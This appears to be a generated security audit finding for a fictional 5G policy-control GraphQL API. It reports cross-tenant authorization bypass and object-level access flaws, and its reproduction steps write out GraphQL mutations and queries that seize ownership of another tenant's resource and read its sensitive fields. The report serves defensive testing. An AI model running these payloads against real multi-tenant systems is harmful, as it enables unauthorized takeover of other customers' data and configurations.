## System

- System: SpectreNet Policy Control v1.0.5
- Domain: TELECOM / 5G CORE
- Example ID: GQL-0015
- Risk ID: RISK-GQL-015

## Findings

### 1. Authorization-Bypass via Cross-Tenant `updateResource` Write + Ownership Transfer (Pattern 5.1 / HAR Primary)

**Primary HAR attack**: The HAR shows `updateResource(id: "R-2015", input: {status: "approved", ownerId: "attacker-86e1b85a"})` from JWT `tenant-86e1`. Pattern 5.1 (Authorization-bypass injection): by injecting a cross-tenant `resourceId` as input, the resolver's authorization context is bypassed — the JWT signature is validated but the injected object ID circumvents tenancy enforcement, allowing the caller to modify and reassign a foreign policy resource.

**HAR evidence**: JWT `x-tenant-id: tenant-86e1`. Request: `updateResource(id: "R-2015", input: {status: "approved", ownerId: "attacker-86e1b85a"})`. Response: HTTP 200 OK with `"tenantId": "tenant-b85a"` — confirms server accepted a write mutation against a cross-tenant policy resource without raising an authorization error.

**Telecom/5G Core impact**: `Resource` objects in a 5G Policy Control (PCF) platform represent QoS policy rules, network slice templates, and subscriber priority profiles. An attacker from one Mobile Network Operator (MNO) can approve, modify, or take ownership of another operator's 5G policy definitions, directly impacting subscriber service quality and network resource allocation.

### 2. BOLA on `getResource` — Missing `tenant_id` Filter (RISK-GQL-015)

Section 4.0 (RISK-GQL-015): `getResource` fetches by `resourceId` without verifying the fetched object's `tenantId` against the JWT.

### 3. BOLA on `bulkResourceLookup` — No Per-ID Ownership Filter (Pattern 1.9)

Section 4.0: documented gap — `bulkResourceLookup` accepts arbitrary IDs without per-ID filtering.

### 4. Redis Cache Without Tenant Dimension

Section 2.0: Redis cache keyed by `resourceId` only — no `tenantId` in the cache key.

## Evidence

- **HAR**: `updateResource(id: "R-2015", input: {status: "approved", ownerId: "attacker-86e1b85a"})` with `tenant-86e1` JWT → HTTP 200 with cross-tenant `tenantId: tenant-b85a` in response.
- **Section 5.0**: Pattern 5.1 — injected cross-tenant `resourceId` bypasses resolver authorization.
- **Section 4.0 (RISK-GQL-015)**: `getResource` lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` lacks per-ID filter.
- **Section 2.0**: Redis cache keyed by `resourceId` only.

## Reproduction

**Step 1 — Baseline:**

```graphql
query { getResource(id: "R-1015") { resourceId tenantId data { sensitiveField } } }
```

Expected: `tenantId: "tenant-86e1"`.

**Step 2 — Authorization-bypass write: approve and transfer ownership of cross-tenant policy (primary HAR attack):**

```graphql
mutation {
  updateResource(id: "R-2015", input: {
    status: "approved",
    ownerId: "attacker-86e1b85a"
  }) {
    resourceId status tenantId ownerId
  }
}
```

Expected secure: Mutation rejected — cross-tenant resource ID is rejected or ownership transfer is blocked.  
Expected vulnerable: HTTP 200 — 5G policy resource `R-2015` from `tenant-b85a` is approved and ownership transferred to attacker.

**Step 3 — Cross-tenant read (RISK-GQL-015):**

```graphql
query { getResource(id: "R-2015") { resourceId tenantId ownerId data { sensitiveField internalNotes } items { itemId } } }
```

**Step 4 — Bulk cross-tenant lookup:**

```graphql
mutation { bulkResourceLookup(ids: ["R-2015", "R-3015", "R-4015"]) { resourceId tenantId data { sensitiveField } } }
```

## Remediation

- **Enforce cross-tenant check before `updateResource`**: verify `resource.tenantId == jwt.tenantId` before applying any mutation — the injected `resourceId` must not bypass the authorization context.
- **Strip `ownerId` from `updateResource` input**: `ownerId` is not a user-settable field.
- **Enforce `tenant_id` WHERE clause in `getResource`** (RISK-GQL-015).
- **Filter `bulkResourceLookup` by JWT `tenantId`**.
- **Add `tenantId` to Redis cache key**.
